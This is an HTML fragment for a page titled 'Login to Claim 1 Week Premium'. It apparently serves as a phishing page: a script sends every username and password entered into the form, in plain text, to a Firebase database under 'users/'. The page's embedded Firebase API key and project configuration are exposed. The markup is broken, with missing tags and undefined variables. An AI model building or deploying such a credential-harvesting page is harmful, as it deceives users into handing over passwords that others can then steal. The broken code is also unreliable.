
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />

    form { background: #fff; padding: 20px; border-radius: 8px; display: inline-block; }

    button { padding: 10px 20px; }

  </style>
</head>
<body>
  <h2>Login to Claim 1 Week Premium</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Enter Username" required />
    <input type="password" id="password" placeholder="Enter Password" required />
    <button type="submit">Login</button>

    const firebaseConfig = {
  apiKey: "AIzaSyBnPdhe7aEGe_Jsygft6IKoM2eiMY84ms8",
  authDomain: "quiz-game-74e4b.firebaseapp.com",
  databaseURL: "https://quiz-game-74e4b.firebaseio.com",
  projectId: "quiz-game-74e4b",
  storageBucket: "quiz-game-74e4b.firebasestorage.app",
  messagingSenderId: "504159527517",
  appId: "1:504159527517:web:ae7a964d083d43c676e3b4"
};

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    document.getElementById("loginForm").addEventListener("submit", async function(e) {

      await push(ref(db, "users/"), { username, password });

    });
  </script>
</body>
